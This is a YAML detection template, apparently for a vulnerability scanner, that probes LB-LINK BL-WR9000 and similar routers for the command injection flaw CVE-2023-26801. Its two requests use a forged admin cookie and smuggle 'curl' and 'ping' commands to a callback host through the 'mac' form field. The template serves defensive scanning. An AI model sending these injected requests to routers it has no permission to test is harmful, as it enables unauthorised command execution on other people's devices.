name: yaml-poc-lb-link-bl-wr9000-rce-CVE-2023-26801
binding: e14d9d32-9583-4024-b97b-992e024465d0
detail:
    author: jiapeng.han
    links:
        - https://github.com/winmt/my-vuls/tree/main/LB-LINK%20BL-AC1900%2C%20BL-WR9000%2C%20BL-X26%20and%20BL-LTE300%20Wireless%20Routers
    vulnerability:
        id: 961cb993-b2f0-40b5-a511-da2fff14b6cb
        level: critical
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
    reverseDomain: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /goform/set_LimitClient_cfg
            headers:
                Content-Type: application/x-www-form-urlencoded
                Cookie: user=admin
            body: time1=00:00-00:00&time2=00:00-00:00&mac=;curl {{reverseURL}};
            follow_redirects: false
        expression: reverse.wait(5)
    r1:
        request:
            cache: true
            method: POST
            path: /goform/set_LimitClient_cfg
            headers:
                Content-Type: application/x-www-form-urlencoded
                Cookie: user=admin
            body: time1=00:00-00:00&time2=00:00-00:00&mac=;ping -c 2 {{reverseDomain}};
            follow_redirects: false
        expression: reverse.wait(5)
expression: r0() || r1()
